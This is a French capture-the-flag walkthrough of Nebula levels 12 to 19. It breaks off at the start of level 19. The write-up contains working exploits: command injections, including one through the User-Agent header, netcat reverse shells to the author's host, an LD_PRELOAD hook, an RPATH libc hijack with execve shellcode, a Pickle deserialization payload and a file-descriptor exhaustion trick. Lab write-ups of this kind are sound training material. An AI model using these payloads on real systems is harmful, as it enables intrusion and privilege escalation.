# Solution du CTF Nebula (levels 12 à 19)

Suite et fin du CTF `Nebula`. Des exercices très intéressants ou bien compliqués.

## Level 12

```shellsession
level12@nebula:/home/flag12$ ls -al
total 6
drwxr-x--- 2 flag12 level12   84 2011-11-20 20:40 .
drwxr-xr-x 1 root   root     420 2012-08-27 07:18 ..
-rw-r--r-- 1 flag12 flag12   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag12 flag12  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 root   root     685 2011-11-20 21:22 flag12.lua
-rw-r--r-- 1 flag12 flag12   675 2011-05-18 02:54 .profile
level12@nebula:/home/flag12$ ps aux | grep flag12
flag12    1212  0.0  0.0   2696   820 ?        S    Jan31   0:00 /usr/bin/lua /home/flag12/flag12.lua
level12  19119  0.0  0.0   4188   792 pts/0    S+   01:24   0:00 grep --color=auto flag12
```

Il y a un script Lua qui tourne avec l'utilisateur qui nous intéresse.

```lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password) 
        prog = io.popen("echo "..password.." | sha1sum", "r")
        data = prog:read("*all")
        prog:close()

        data = string.sub(data, 1, 40)

        return data
end


while 1 do
        local client = server:accept()
        client:send("Password: ")
        client:settimeout(60)
        local line, err = client:receive()
        if not err then
                print("trying " .. line) -- log from where ;\
                local h = hash(line)

                if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
                        client:send("Better luck next time\n");
                else
                        client:send("Congrats, your token is 413**CARRIER LOST**\n")
                end

        end

        client:close()
end
```

Je ne suis pas familier avec Lua mais cet appel à `popen` me laisse penser qu'il y a une injection de commande possible.

J'ai tenté quelques injections classiques :

```shellsession
level12@nebula:/home/flag12$ nc 127.0.0.1 50001 -v
Connection to 127.0.0.1 50001 port [tcp/*] succeeded!
Password: id
Better luck next time
level12@nebula:/home/flag12$ nc 127.0.0.1 50001 -v
Connection to 127.0.0.1 50001 port [tcp/*] succeeded!
Password: sleep 10
Better luck next time
level12@nebula:/home/flag12$ nc 127.0.0.1 50001 -v
Connection to 127.0.0.1 50001 port [tcp/*] succeeded!
Password: ;sleep 10;
Better luck next time
level12@nebula:/home/flag12$ nc 127.0.0.1 50001 -v
Connection to 127.0.0.1 50001 port [tcp/*] succeeded!
Password: `sleep 10`
Better luck next time
```

Sur cette dernière j'obtiens une temporisation, l'injection a bien eu lieu. J'injecte la commande `nc.traditional -e /bin/bash 192.168.56.1 4444` et j'obtiens mon reverse shell :

```shellsession
$ ncat -l -p 4444 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.97.
Ncat: Connection from 192.168.56.97:51397.
id
uid=987(flag12) gid=987(flag12) groups=987(flag12)
getflag
You have successfully executed getflag on a target account
```

## Level 13

Un `strings` sur le binaire nous laisse supposer qu'l fait des calculs sur la chaine bizarre avant de l'afficher si effectivement `getuid` retourne ce qu'il attend.

```shellsession
level13@nebula:~$ strings ../flag13/flag13 
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
exit
puts
__stack_chk_fail
printf
getuid
__libc_start_main
GLIBC_2.4
GLIBC_2.0
PTRhp
UWVS
[^_]
Security failure detected. UID %d started us, we expect %d
The system administrators will be notified of this violation
8mjomjh8wml;bwnh8jwbbnnwi;>;88?o;9ob
your token is %s
;*2$"(
```

On va hooker cet appel en créant une librairie :

```c
// compile with gcc -shared -fPIC -o libuid.so uid.c
#define _GNU_SOURCE
#include <sys/types.h>

uid_t getuid(void) {
  return  (uid_t)1000;
}
```

Evidemment ça ne marche pas sur le binaire à son emplacement originel car il est setuid. L'utilisation de `LD_PRELOAD` se détective sur les setuid sans quoi ce serait la journée portes ouvertes.

```shellsession
level13@nebula:/tmp$ LD_PRELOAD=/tmp/libuid.so /home/flag13/flag13
Security failure detected. UID 1014 started us, we expect 1000
The system administrators will be notified of this violation
```

Quand on copie le binaire le bit setuid est automatiquement retiré c'est pour ça que ça fonctionne.

```shellsession
level13@nebula:/tmp$ LD_PRELOAD=/tmp/libuid.so ./flag13 
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
```

Avec le mot de passe on peut alors se connecter en `flag13` et exécuter `getflag` correctement.

## Level 14

Le binaire encode la chaine qu'on lui passe sur l'entrée standard.

```shellsession
level14@nebula:/home/flag14$ ./flag14
./flag14
        -e      Encrypt input
level14@nebula:/home/flag14$ ./flag14 -e
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
abcdefghijklmnopqrstuvwxyz{|}~�����.^C
level14@nebula:/home/flag14$ ./flag14 -e
abcd
aceg^C
```

Pas besoin de reverser le programme pour comprendre que chaque caractère est incrémenté de sa position dans la chaine (c'est pour cela que la suite de `a` retourne l'alphabet).

Le fichier token étant lisible on va procéder à l'étape inverse en Python.

```shellsession
level14@nebula:/home/flag14$ ls token  -al
-rw------- 1 level14 level14 37 2011-12-05 18:59 token
level14@nebula:/home/flag14$ cat token 
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
```

Avec le passe obtenu on peut se connecter puis obtenir le flag.

```python
level14@nebula:/home/flag14$ python
Python 2.7.2+ (default, Oct  4 2011, 20:03:08) 
[GCC 4.6.1] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> print ''.join([chr(ord(c) - i) for i, c in enumerate("857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.")])
8457c118-887c-4e40-a5a6-33a25353165
```

## Level 15

Si on obtient le dump assembleur de la fonction `main` via objdump on est surpris par sa petite taille :

```nasm
Disassembly of section .text:

08048330 <main>:
 8048330:       55                      push   %ebp
 8048331:       89 e5                   mov    %esp,%ebp
 8048333:       83 e4 f0                and    $0xfffffff0,%esp
 8048336:       83 ec 10                sub    $0x10,%esp
 8048339:       c7 04 24 d0 84 04 08    movl   $0x80484d0,(%esp)
 8048340:       e8 bb ff ff ff          call   8048300 <puts@plt>
 8048345:       c9                      leave  
 8048346:       c3                      ret    
 8048347:       90                      nop
```

Le message poussé par `puts` nous conseille de balancer le binaire à strace :

```shellsession
level15@nebula:/home/flag15$ strace ./flag15 
execve("./flag15", ["./flag15"], [/* 19 vars */]) = 0
brk(0)                                  = 0x90d2000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb784a000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbffec044) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbffec044) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbffec044) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
--- snip ---
```

Le binaire semble aller chercher les librairies dans `/var/tmp/flag15/` ce qui est pour le moins étrange car il n'y a aucune entrée de ce type dans `ld.so.preload`.

La configuration semble propre au binaire. On peut retrouver le path mentionné dans la section `.dynstr` de l'exécutable :

```shellsession
level15@nebula:/home/flag15$ objdump -s flag15  | grep -5 flag15 

flag15:     file format elf32-i386

Contents of section .interp:
 8048154 2f6c6962 2f6c642d 6c696e75 782e736f  /lib/ld-linux.so
 8048164 2e3200                               .2.             
Contents of section .note.ABI-tag:
--
Contents of section .dynstr:
 804821c 005f5f67 6d6f6e5f 73746172 745f5f00  .__gmon_start__.
 804822c 6c696263 2e736f2e 36005f49 4f5f7374  libc.so.6._IO_st
 804823c 64696e5f 75736564 00707574 73005f5f  din_used.puts.__
 804824c 6c696263 5f737461 72745f6d 61696e00  libc_start_main.
 804825c 2f766172 2f746d70 2f666c61 67313500  /var/tmp/flag15.
 804826c 474c4942 435f322e 3000               GLIBC_2.0.      
Contents of section .gnu.version:
 8048276 00000200 00000200 0100               ..........      
Contents of section .gnu.version_r:
 8048280 01000100 10000000 10000000 00000000  ................
```

En fait on en sait plus avec `objdump -p` qui nous indique :

```
RPATH                /var/tmp/flag15
```

C'est expliqué dans la manpage de `dlopen` que le linker a un ordre pour aller chercher les librairies système et que le premier choix est le `RPATH` (sans doute fixé avec une option de compilation).

On dispose des droits en écriture sur le dossier donc on peut y placer notre librairie pour substituer à la `libc.so.6`.

```shellsession
level15@nebula:/tmp$ ls -dl /var/tmp/flag15/
drwxrwxr-x 2 level15 level15 3 2012-10-31 01:38 /var/tmp/flag15/
```

Pour parvenir à créer une librairie acceptée par le binaire j'ai essayé un paquet de méthodes. D'abord avec une fonction de constructeur qui est sensée se charger quand le linker est appelé.

Ca semblait plutôt prometteur sauf qu'au moment de vouloir appeller `system` depuis mon code j'ai compris que ma libc ne pouvait pas appeller la vrai libc.

J'ai trouvé un compromis via l'option du compilateur `-nostdlib` mais en contrepartie je ne pouvais pas appeller une fonction de la libc, je suis donc partie sur l'idée de faire d'exécuter un shellcode.

D'abord j'ai suivi la méthode du simple cast de `char *` en pointeur sur fonction mais ça crashait. Je suis donc passé sur l'utilisation de ASM inline mais certaines instructions crashaient aussi comme si la section utilisée n'était pas écrivable.

Après avoir changé le shellcode pour faire de l'assembleur *plus classique*  et avoir corrigé quelques erreurs de ma part je suis parvenu à cette solution :

```c
#include <stdlib.h>
#include <unistd.h>


void __attribute__ ((constructor)) my_init(void)
{ 
        __asm(
                // setreuid(984, 984)
                "movl $0x46, %eax\n\t"
                "movl $0x3d8, %ebx\n\t"
                "movl $0x3d8, %ecx\n\t"
                "int $0x80\n\t"

                // execve
                "xor    %ecx, %ecx\n\t"
                "xor    %edx, %edx\n\t"
                "push   %ecx\n\t" // null byte
                "push   $0x68732f2f\n\t" // //sh
                "push   $0x6e69622f\n\t" // /bin
                "mov    %esp, %ebx\n\t"
                "push %edx\n\t"
                "push %ebx\n\t"
                "movl $0xb, %eax\n\t"
                "int    $0x80\n\t"

                // exit
                "xorl %eax,%eax\n\t"
                "xorl %ebx,%ebx\n\t"
                "incl %eax\n\t"
                "int $0x80\n\t"

        );
}
```

Ca fonctionne malgré un warning :

```shellsession
level15@nebula:/tmp$ gcc -shared -nostdlib libc.so.6.c -o /var/tmp/flag15/libc.so.6 
level15@nebula:/tmp$ /home/flag15/flag15 
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
flag15@nebula:/tmp$ getflag
You have successfully executed getflag on a target account
```

J'ai trouvé deux autres solutions sur [information security notes](https://73696e65.github.io/2015/06/exploit-exercises-nebula-11-15#level15).

La première consiste à réécrire `__libc_start_main` :

```c
#include <stdio.h>

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) { 
  setreuid(geteuid(),geteuid());
  execve("/bin/sh", NULL, NULL);

  return 0;
}
```

Il faut compiler ce cette façon :

```bash
gcc -shared -static-libgcc -Wl,--version-script=version.map,-Bstatic libc.so.6.c -o /var/tmp/flag15/libc.so.6
```

Parmis les points importants le `-shared` et le `-Bstatic` font que cette librairie partagée... est statique. Du coup elle permet d'utiliser les fonctions de la libc sans problème de doublon des symboles.

L'autre point important c'est l'option `--version-script=version` qui indique à `gcc` d'aller lire le numéro de version de la librairie dans le fichier `version.map`.

Il faut qu'il ressemble à ceci (dans le cas de ce CTF)  :

```
GLIBC_2.0 { };
```

Dans le cas contraire on obtient un message d'erreur :

```
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
```

Pour l'autre solution dans l'article mentionné il fallait seulement compiler le code assembleur à part (via `nasm`) pour qu'il ait les bonnes sections.

Il y a une autre solution similaire ici : [Exploit-Exercises-Nebula/Level15——动态链接库劫持.org at master · lu4nx/Exploit-Exercises-Nebula · GitHub](https://github.com/lu4nx/Exploit-Exercises-Nebula/blob/master/Level15%E2%80%94%E2%80%94%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%8A%AB%E6%8C%81.org).

## Level 16

Ce level a été intéressant. On trouve un script CGI qui est accessible sur le port 1616 via un `thttpd`.

```perl
#!/usr/bin/env perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub login {
        $username = $_[0];
        $password = $_[1];

        $username =~ tr/a-z/A-Z/;       # conver to uppercase
        $username =~ s/\s.*//;          # strip everything after a space

        @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
        foreach $line (@output) {
                ($usr, $pw) = split(/:/, $line);


                if($pw =~ $password) { 
                        return 1;
                }
        }

        return 0;
}

sub htmlz {
        print("<html><head><title>Login resuls</title></head><body>");
        if($_[0] == 1) {
                print("Your login was accepted<br/>");
        } else {
                print("Your login failed<br/>");
        }
        print("Would you like a cookie?<br/><br/></body></html>\n");
}

htmlz(login(param("username"), param("password")));
```

On devine immédiatement la présence d'une injection de commande via la ligne qui appelle `egrep` mais le passage en majuscules et le retrait des espaces et ce qui s'en suit est génant.

Ma première idée a été que peut être je pourrais passer une commande en hexadécimal sans utiliser `xxd` ou une quelconque commande avec une fonctionnalité obscure de bash du genre `$(\xDE\xAD\xBE\xEF)` mais je n'ai rien trouvé de tel.

Je me suis donc concentré sur l'idée de faire exécuter une commande en n'utilisant que des majuscules et caractères spéciaux.

En utilisant une variable d'environnement (qui sont généralement en majuscules) j'espérais pouvoir appeller un path sous mon contrôle. Mettons qu'il y ait une variable `TMP` égale à `/tmp` dans l'environnement je pourrais tenter d'appeller `$TMP/BACKDOOR`. Malheureusement il n'y avait rien de tel. Il ne restait qu'à voir quelles autres variables le script CGI avait à sa disposition.

J'ai créé une instance de `thttpd` pour moi sur la VM et appelé le script suivant :

```perl
#!/usr/bin/env perl

print "Content-type: text/html\n\n";
print "<pre>\n";

foreach $key (sort keys(%ENV)) {
  print "$key = $ENV{$key}<p>";
}
print "</pre>\n";
```

J'ai ainsi retrouvé les variables classiques comme `HTTP_USER_AGENT`, `HTTP_ACCEPT_LANGUAGE`, etc.

En plaçant la commande à exécuter dans le `User-Agent` il me suffit de sortir du double quote de la commande et de faire interpréter la variable. Le serveur `thttpd` semble couper l'URL sur les points virgules j'ai eu donc recours au caractère `&` à la place.

```shellsession
$ curl "http://192.168.56.97:1616/index.cgi?username=%22%26%24HTTP_USER_AGENT%26%23&password=123" -A "nc.traditional -e /bin/bash 192.168.56.1 9999"
<html><head><title>Login resuls</title></head><body>Your login failed<br/>Would you like a cookie?<br/><br/></body></html>
```

soit l'injection `"&$HTTP_USER_AGENT&#`

J'obtiens mon reverse shell :

```shellsession
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.97.
Ncat: Connection from 192.168.56.97:59833.
id
uid=983(flag16) gid=983(flag16) groups=983(flag16)
getflag
You have successfully executed getflag on a target account
```

J'ai vu que la plupart des participants ont trouvé des méthodes alternatives. La première consiste à utiliser les caractères `*` ou `?` pour par exemple exécuter `/tmp/SH` en spécifiant `/*/SH`.

L'autre méthode est une feature de bash qui permet de changer la case d'une variable :

```shellsession
$ MYENV="HELLO WORLD"
$ echo ${MYENV,,}
hello world
$ MYENV="hello world"
$ echo ${MYENV^^}
HELLO WORLD
```

Fantastique !

## Level 17

On a une désérialisation via Pickle que j'ai déjà croisé sur d'autres CTFs :

```python
#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
        line = skt.recv(1024)

        obj = pickle.loads(line)

        for i in obj:
                clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
        clnt, addr = skt.accept()

        if(os.fork() == 0):
                clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
                server(clnt)
                exit(1)
```

J'ai recours au même projet que d'habitude : [GitHub - francescolacerenza/evilPick: An Exploit Crafter to achieve Pickle Deserialization Remote Code Execution](https://github.com/francescolacerenza/evilPick)

```shellsession
level17@nebula:/tmp$ cat > rce.py
import os
os.system("nc.traditional -e /bin/sh 192.168.56.1 9999")
^C
level17@nebula:/tmp$ python evilPick.py --foo rce.py 
                             
                                                           -oysoosyyyo:`                            
                                                         :yyys+ossssyyyy+.                          
                                                       `oyyyysoo++oosyyyyy/                         
                                                      `yyyo//ossssss/syyyyy:                        
                                                     .yyy-`-``:ssssossyyyyyo                        
                                                    .yyyy.````-/.`.:osyyyyyy                        
                                                   -yyysyy+:/++``-.`:yyyyyyy                        
                                                  /yhhmNhssysss:.``-syyyyyyo                        
                                                 +yyhdNNmysysssyssyyyyyyyyy.                        
                                               `oyyysyhdNmmmhdmddyyyyyyyyy+                         
                                              `syhyysssyshdmmddNNmhyyyyyyy`                         
                                             `syyyyssssssssyohhmmdyyyyyyy-                          
                                            `syyyyyssssssssssshhyyyyyyyy:                           
                                           .syyyyysssssssssssyyyyyyyyyy/                            
                                          -yyyyyyssssssssssyyyyyyyyyyyo                             
                                         :yyyyyyssssssssssyyyyyyyyyyyo`                             
                                       `+yyyyyysssssssssyyyyyyyyyyyys`                              
                                      .syyyyyssssssssyyyyyyyyyyyyyys`                               
                                     :yyyyysssssssssyyyyyyyyyyyyyys.                                
                                   .oyyyyyssssssssyyyyyyyyyyyhyyyy.                                 
                                 `/syyyyysssssssssyyyyyyyyyyyyyyy-                                  
                               `:syyyyyysssssssssyyyyyyyyyyyyyys.                                   
                              -oyyyyyyysssssssssyyyyyyyyyyyyyyo`             I'M                       
                            `+yyyyyyhyssssssssyyyyyyyyyyyyyyy+              RICK                        
                           .syhyyyysssssssssyyyyyyyyyyyyyyyy/                                       
                          :yyyyyyyssssssssyyyyyyyyyyyyyyyyy-                                        
                         :yyyyyyssssssssyyyyyyyyyyyyyyyyyo.                                         
                        .hyyyyyssssssssyyyyyyyyyyyyyyyys-                                           
                        syyyyyyssssssyyyyyyyyyhyyyyyyy:                                             
                        hyyyyyyssssyyyyyyyyyyyyyyyyy/`                                              
                        hyyyyyyyyyyyyyyyyyyyyyyyyy/`                                                
                        oyyyyyyyyyyyyyyyyyyyyyyy/`                                                  
                         +yyyyyyyyyyyyyyyyyyys:                                                     
                          `:+syyyyyyyyyyys+:.                                                       
                              `.-://::-.                                                            
                                                                                                    
                                         
            .__.__           .__        __   .__          
  _______  _|__|  |   ______ |__| ____ |  | _|  |   ____  
_/ __ \  \/ /  |  |   \____ \|  |/ ___\|  |/ /  | _/ __ \ 
\  ___/\   /|  |  |__ |  |_> >  \  \___|    <|  |_\  ___/ 
 \___  >\_/ |__|____/ |   __/|__|\___  >__|_ \____/\___  >
     \/               |__|           \/     \/         \/ 

                         - A -
    - Pickle Deserialization Remote Code Execution - 
                  - Exploit Crafter -
     - Just provide the wanted to execute code -



                                A Supid Tool by Thesaurus 
___________________________________________________________
___________________________________________________________
[^] Do you want to encode it? ( base64 or hex,leave for unicode) :  
[*] Crafted Evil Packet: 

ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwAAAAABAAAAAgAAAEMAAABzHQAAAGQBAGQAAGwAAH0AAHwAAGoBAGQCAIMBAAFkAABTKAMAAABOaf////9zKwAAAG5jLnRyYWRpdGlvbmFsIC1lIC9iaW4vc2ggMTkyLjE2OC41Ni4xIDk5OTkoAgAAAHQCAAAAb3N0BgAAAHN5c3RlbSgBAAAAUgAAAAAoAAAAACgAAAAAcwgAAAA8c3RyaW5nPnQDAAAAZm9vAQAAAHMEAAAAAAEMAQ=='
tRtRc__builtin__
globals
(tRS''
tR(tR.

___________________________________________________________
[^] Do you want to save it? (y/n, leave to skip):  y
[^] Insert exploit name: mypickle
[*] Writing it in mypickle

__________________________Job_Done_________________________
level17@nebula:/tmp$ nc 127.0.0.1 10007 < mypickle 
Accepted connection from 127.0.0.1:49810
```

```shellsession
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.97.
Ncat: Connection from 192.168.56.97:59835.
id
uid=982(flag17) gid=982(flag17) groups=982(flag17)
getflag
You have successfully executed getflag on a target account
```

## Level 18

Ce level a été de loin le plus difficile. D'ailleurs la solution n'est pas de moi.

On a un fichier `password` qui nous est inaccessible et un binaire setuid :

```shellsession
level18@nebula:/home/flag18$ ls -l
total 13
-rwsr-x--- 1 flag18 level18 12216 2011-11-20 21:22 flag18
-rw------- 1 flag18 flag18     37 2011-11-20 21:22 password
```

On dispose aussi du code source du binaire :

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <getopt.h>

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile && globals.verbose >= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE "/home/flag18/password"

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf("Unable to read password file %s\n", PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;       
  }
  dprintf("logged in successfully (with%s password file)\n",
      fp == NULL ? "out" : "");
  
  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
  printf("%s\n", msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, "d:v")) != -1) {
      switch(c) {
          case 'd':
              globals.debugfile = fopen(optarg, "w+");
              if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, 0);
              break;
          case 'v':
              globals.verbose++;
              break;
      }
  }

  dprintf("Starting up. Verbose level = %d\n", globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());
  
  while(1) {
      char line[256];
      char *p, *q;

      q = fgets(line, sizeof(line)-1, stdin);
      if(q == NULL) break;
      p = strchr(line, '\n'); if(p) *p = 0;
      p = strchr(line, '\r'); if(p) *p = 0;

      dvprintf(2, "got [%s] as input\n", line);

      if(strncmp(line, "login", 5) == 0) {
          dvprintf(3, "attempting to login\n");
          login(line + 6);
      } else if(strncmp(line, "logout", 6) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "shell", 5) == 0) {
          dvprintf(3, "attempting to start shell\n");
          if(globals.loggedin) {
              execve("/bin/sh", argv, envp);
              err(1, "unable to execve");
          }
          dprintf("Permission denied\n");
      } else if(strncmp(line, "logout", 4) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "closelog", 8) == 0) {
          if(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile = NULL;
      } else if(strncmp(line, "site exec", 9) == 0) {
          notsupported(line + 10);
      } else if(strncmp(line, "setuser", 7) == 0) {
          setuser(line + 8);
      }
  }

  return 0;
}
```

A première vue il y a plusieurs choses qui clochent :

* vulnérabilité format string dans `notsupported` à travers l'alias `dprintf`. Sauf que si on tente de jouer un peu :

```shellsession
level18@nebula:/home/flag18$ ./flag18 -d toto  -v
site exec %5$08x
*** invalid %N$ use detected ***
Aborted
```

* stack overflow dans `setuser`, sauf que cette fois on est bloqué par stack protector. Il y a aussi l'ASLR qui est actif. Toutefois on est sur du 32 bits et l'ASLR est désactivable ou brute-forçable. En vrai même si on ne peut pas utiliser l'indicateur de position pour les chaines de formats dans la vulnérabilité précédente, on peut utiliser une suite de `%08x` pour regarder dans la stack et fuiter une adresse quelconque de la libc (`0x0029ebe8` dans l'exemple qui suit).

```
08048f4e.bfecbed8.00e42c30.0d0d0d0d.090481d8.08048f4d.00e4e918.bfecbdbc.08048b86.bfecbdc6.08048faa.00000009.00000001.00000000.00e3e74d.bfecbf88.bfecbf74.0029ebe8.00000001.b77b9b18.65746973.65786520.30252063.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838
```

TOUTEFOIS on ne peux pas voir le canary de cette façon car la longueur de notre chaine de format est limitée par la lecture de 256 octets par `fgets` dans la boucle while.

Le canary a un octet de poids faible à 0 donc il n'y a que 3 octets à brute-forcer, ça ne fait que... 16777215 possibilités... quand même. Et là ne programme ne `fork` pas donc le canary change de valeur à chaque exécution.

Et de toute façon le buffer overflow se fait ici via `sprintf` donc on peut directement abandonner l'idée de passer l'octet nul pour le canary.

* dernier point qui me semblait possible : le binaire lit un mot de passe présent dans `/home/flag18/password` et le compare à la valeur que l'on peut donner via la commande `login`. Le binaire offre aussi une option `-d` permettant de spécifier un fichier de log et donc d'écrire du contenu avec les droits de l'utilisateur `flag18`.

J'ai pensé par conséquent à écraser ce fichier `password` par le fichier de log mais ce dernier aura toujours un entête `Starting up...` qu'on ne contrôle pas. Ce ne serait pas génant d'avoir cette chaine comme mot de passe MAIS elle contient un retour à la ligne qui sera conservé par le `fgets` de `login` alors que la boucle while de son côté transforme le premier retour à la ligne en octet nul... du coup la comparaison ne fonctionnera jamais.

Si l'utilisateur avait eu un dossier `.ssh` nous aurions pu créer (via le fichier de log) un fichier `authorized_keys` avec une clé publique faible pour passer ne pas dépasser les 256 octets... mais ce n'est pas le cas.

Le dernier bug qu'il fallait trouver se situe aussi dans la fonction `login` : si la fonction `fopen` échoue le programme marque que l'on est authentifié. On peut alors utiliser la commande `shell`.

Pour arriver à nos fins il faut faire en sorte que le binaire atteigne le maximum de descripteurs de fichiers ouverts. La limite est à priori appliquée sur le processus et son processus parent. J'ai donc écrit un code similaire à ce que d'autres ont fait :

```c
#include <unistd.h>
#include <stdio.h>

extern char **environ;

int main(int argc, char *argv[]) {
        int n = atoi(argv[1]);
        char line[2];
        int i;
        int fd;
        char* const args[] = {"/home/flag18/flag18", "--rcfile", "-d", "/tmp/log", NULL};

        for (i=0; i<n; i++) {
                fd = dup(1);
        }
        printf("ready\n");
        fgets(line, 2, stdin);
        execve(args[0], args, environ);
        return 0;
}
```

Le binaire duplique le descripteur de l'entrée standard autant de fois qu'on lui demande. Il affiche ensuite `ready` et attend qu'on tape sur `Enter`. Il lance alors le binaire vulnérable.

Par défaut ça ne fonctionne pas car le binaire n'a même plus de disponibilités pour charger les librairies :

```shellsession
level18@nebula:~$ ./exhaust 1020
ready

/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'r'
/home/flag18/flag18: invalid option -- 'c'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
login aa
shell
/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
```

Il faut avoir recours à la commande `closelog` présente dans le binaire à cet effet : elle ferme le descripteur du fichier de log et ça permet alors aux librairies de se charger :

```shellsession
level18@nebula:~$ ./exhaust 1020
ready

/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'r'
/home/flag18/flag18: invalid option -- 'c'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
login aa
closelog
shell
/tmp/log: line 2: syntax error near unexpected token `('
/tmp/log: line 2: `logged in successfully (without password file)'
```

J'obtiens alors mon reverse shell :

```shellsession
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.97.
Ncat: Connection from 192.168.56.97:52243.
id
uid=981(flag18) gid=1019(level18) groups=981(flag18),1019(level18)
pwd
/home/level18
cd ../flag18
ls
flag18
toto
cat password
44226113-d394-4f46-9406-91888128e27a
getflag
You have successfully executed getflag on a target account
```

Pour y arriver il aura aussi fallu que je créé un script bash (contenant l'appel à Netcat) nommé `Starting` car l'option `--rcfile` qui est transférée à bash va essayer d'exécuter notre fichier de log.

Voir les solutions ici pour plus de détails :

[Cracking Nebula Part 2](https://unlogic.co.uk/posts/2014-07-02-cracking-nebula-part2/)

[Craftware](https://craftware.xyz/ctf/2012/07/21/Nebula-wargame-walkthrough.html)

[---=[ Kernel Inside ]=---: Nebula CTF - level18](https://www.kernelinside.com/2018/07/nebula-ctf-level18.html)

Quelq'un a réussi à bypasser la protection sur la chaine de format (du gros level) : https://www.voidsecurity.in/2012/09/exploit-exercise-format-string.html

## Level 19

On dispose du code C suivant :

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

